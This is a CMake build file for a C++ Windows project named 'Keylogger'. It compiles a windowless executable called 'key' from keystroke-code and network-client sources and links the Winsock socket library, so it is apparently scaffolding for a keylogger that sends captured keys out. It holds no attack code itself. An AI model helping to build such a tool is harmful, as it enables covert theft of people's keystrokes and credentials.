cmake_minimum_required(VERSION 3.31)
project(Keylogger)

set(CMAKE_CXX_STANDARD 20)

add_executable(Keylogger WIN32
        src/main.cpp
        src/vkCodes.cpp
        src/vkCodes.h
        src/client.h
        src/client.cpp
)

target_link_libraries(Keylogger "ws2_32")
set_target_properties(Keylogger PROPERTIES RUNTIME_OUTPUT_DIRECTORY "../exe" OUTPUT_NAME "key")